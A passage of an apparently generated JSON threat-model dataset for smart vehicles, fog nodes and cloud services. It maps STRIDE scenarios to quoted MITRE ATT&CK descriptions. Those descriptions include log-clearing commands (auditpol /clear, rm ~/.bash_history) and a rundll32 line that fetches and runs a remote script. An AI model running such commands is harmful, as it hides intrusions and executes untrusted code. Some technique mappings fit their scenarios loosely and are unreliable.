registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Cloud services deny having received or processed certain data from fog nodes, disrupting long-term data analytics.",
            "Assumptions": [
                {
                    "Assumption": "Logs tracking data flow from fog nodes to cloud services are either missing or insufficient.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient logging for data tracking."
                },
                {
                    "Assumption": "Cloud services do not acknowledge data receipt properly.",
                    "Role": "System Designer",
                    "Condition": "Lack of data receipt acknowledgment mechanisms."
                }
            ],
            "Potential Impact": "Issues in accountability for data processing, disrupting comprehensive data analytics and cloud applications.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "cloud services",
                "data analytics"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is sent in plain text between smart vehicles and fog nodes, which is intercepted by an attacker.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels between smart vehicles and fog nodes are unencrypted.",
                    "Role": "System Designer",
                    "Condition": "Unencrypted data transmission."
                },
                {
                    "Assumption": "The attacker has the capability to intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to network and data transmission."
                }
            ],
            "Potential Impact": "Exposure of sensitive data, leading to privacy breaches and potential misuse.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "unencrypted data",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored at fog nodes is accessed by unauthorized personnel through insufficiently secured access controls.",
            "Assumptions": [
                {
                    "Assumption": "Access controls on fog nodes are weak or misconfigured.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate access control policies."
                },
                {
                    "Assumption": "The attacker has insider access or can gain such access.",
                    "Role": "Attacker",
                    "Condition": "Insider threat or compromised credentials."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data, leading to data leaks and possible exploitation.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "access control",
                "fog node",
                "data leak"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data visualization dashboards expose sensitive vehicle and user data due to improper role-based access control implementations.",
            "Assumptions": [
                {
                    "Assumption": "Role-based access control is not implemented effectively.",
                    "Role": "System Designer",
                    "Condition": "Misconfigured or absent role-based access controls."
                },
                {
                    "Assumption": "Unauthorized individuals can gain access to data visualization tools.",
                    "Role": "Attacker",
                    "Condition": "Improper access control implementation."
                }
            ],
            "Potential Impact": "Exposure of sensitive data through compromised data visualization dashboards.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "role-based access control",
                "data visualization",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack targets fog nodes, overwhelming them with traffic and disrupting local processing.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not have adequate DDoS protection measures.",
                    "Role": "System Administrator",
                    "Condition": "Lack of DDoS mitigation strategies."
                },
                {
                    "Assumption": "The attacker can marshal enough resources to generate a significant amount of traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to a botnet or other large-scale resource."
                }
            ],
            "Potential Impact": "Disruption of local processing capabilities, leading to delays or failures in traffic management.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network traffic",
                "fog nodes"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infiltrates smart vehicles, causing them to flood fog nodes with fake data requests.",
            "Assumptions": [
                {
                    "Assumption": "Smart vehicles have minimal malware protection.",
                    "Role": "Vehicle Manufacturer",
                    "Condition": "Weak or absent malware protections."
                },
                {
                    "Assumption": "The attacker is able to deploy malware to several smart vehicles.",
                    "Role": "Attacker",
                    "Condition": "Ability to deploy malware at scale."
                }
            ],
            "Potential Impact": "Overloading fog nodes, leading to degraded service or total failure.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "smart vehicles",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Cloud services are overwhelmed by large-scale data requests from compromised fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes can send unlimited data requests to cloud services.",
                    "Role": "System Designer",
                    "Condition": "Unrestricted data request permissions."
                },
                {
                    "Assumption": "Compromised fog nodes can continuously send large data requests without detection.",
                    "Role": "Attacker",
                    "Condition": "Ability to compromise and control fog nodes."
                }
            ],
            "Potential Impact": "Disruption of cloud services, affecting long-term data analysis and storage capabilities.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud services",
                "fog nodes",
                "large-scale data requests"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates their privileges on a fog node to gain full control over it.",
            "Assumptions": [
                {
                    "Assumption": "There are vulnerabilities in the software running on fog nodes.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched or outdated software."
                },
                {
                    "Assumption": "Effective privilege escalation is possible due to weak access controls.",
                    "Role": "System Designer",
                    "Condition": "Weak access control mechanisms."
                }
            ],
            "Potential Impact": "Complete control over fog node functionality, leading to unauthorized access and manipulation of data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "control",
                "fog node",
                "software vulnerability"
            ],
            "mitre_technique": {
                "name": "Rundll32",
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
                "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
                "technique_id": "T1218.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious insiders exploit weak role-based access controls to gain unauthorized administrative access to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Role-based access control is not strictly enforced.",
                    "Role": "System Administrator",
                    "Condition": "Lax enforcement of access control policies."
                },
                {
                    "Assumption": "Insiders have legitimate access up to a certain privilege level.",
                    "Role": "Insider",
                    "Condition": "Existing access to system."
                }
            ],
            "Potential Impact": "Insiders gain administrative privileges, leading to potential abuse and unauthorized data manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "cloud services",
                "access control violation"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits application vulnerabilities in RSUs to gain higher privileges than intended.",
            "Assumptions": [
                {
                    "Assumption": "The RSUs run software with known vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched or insecure application software."
                },
                {
                    "Assumption": "No mechanisms to detect and block privilege escalation attempts.",
                    "Role": "System Designer",
                    "Condition": "Lack of intrusion detection mechanisms."
                }
            ],
            "Potential Impact": "Gaining higher privileges allows attackers to interfere with RSU operations, compromising road safety.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "RSU",
                "software vulnerability",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "13",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a smart vehicle's identity to send false data to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Lack of robust authentication mechanisms for smart vehicles.",
                    "Role": "Attacker",
                    "Condition": "Valid when there is no proper authentication in place."
                },
                {
                    "Assumption": "Fog nodes trust vehicle data without verification.",
                    "Role": "Fog Node",
                    "Condition": "Valid if fog nodes do not verify data sources."
                },
                {
                    "Assumption": "Smart vehicle identities are easily obtainable.",
                    "Role": "Attacker",
                    "Condition": "Valid if identities are exposed or predictable."
                }
            ],
            "Potential Impact": "Unauthorized data can corrupt system processing and potentially expose incorrect information to all users.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity theft",
                "data injection",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a fog node to send malicious commands to smart vehicles.",
            "Assumptions": [
                {
                    "Assumption": "Fog node authentication is not strong.",
                    "Role": "Attacker",
                    "Condition": "Valid if weak authentication or no mutual authentication is implemented."
                },
                {
                    "Assumption": "Smart vehicles act on any incoming data from fog nodes.",
                    "Role": "Smart Vehicle",
                    "Condition": "Valid if there is no validation of commands from fog nodes."
                },
                {
                    "Assumption": "Attacker can access network where fog nodes operate.",
                    "Role": "Attacker",
                    "Condition": "Valid if network security is compromised."
                }
            ],
            "Potential Impact": "System integrity could be compromised leading to unauthorized control of smart vehicles.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device control",
                "network",
                "data injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs cloud services to intercept and manipulate data flows between fog nodes and cloud.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not verify the identity of cloud services.",
                    "Role": "Fog Node",
                    "Condition": "Valid if there is no mutual authentication."
                },
                {
                    "Assumption": "Data sent from fog nodes is not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Valid if data is transmitted in plain text."
                },
                {
                    "Assumption": "Attacker has access to the network used by fog nodes and cloud services.",
                    "Role": "Attacker",
                    "Condition": "Valid if network security is low or breached."
                }
            ],
            "Potential Impact": "Data confidentiality and integrity can be severely impacted by unauthorized access and manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "data interception",
                "network",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to 